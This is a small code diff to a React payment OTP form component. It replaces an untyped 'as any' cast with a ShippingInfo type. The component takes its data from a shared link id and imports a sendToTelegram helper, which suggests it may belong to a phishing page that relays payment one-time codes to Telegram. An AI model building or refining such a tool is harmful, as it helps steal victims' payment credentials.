@@ -9,6 +9,7 @@ import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import type { ShippingInfo } from "@/types/payment";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -33,7 +34,7 @@ const PaymentOTPForm = () => {
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
 
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = linkData?.payload as ShippingInfo | undefined;
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
